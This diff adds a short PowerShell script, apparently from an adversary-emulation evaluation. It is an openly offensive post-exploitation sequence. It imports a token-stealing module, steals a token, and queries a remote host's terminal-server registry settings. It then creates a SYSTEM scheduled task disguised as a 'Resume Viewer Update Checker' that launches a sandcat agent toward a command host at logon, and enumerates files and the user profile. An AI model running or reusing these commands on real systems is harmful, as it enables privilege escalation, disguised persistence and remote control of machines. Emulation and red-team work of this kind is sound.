@@ -1,0 +1,7 @@
+Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\192.0.2.20\hklm\system\currentcontrolset\control\terminal server"';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe 192.0.2.10 evals" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b 192.0.2.20';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
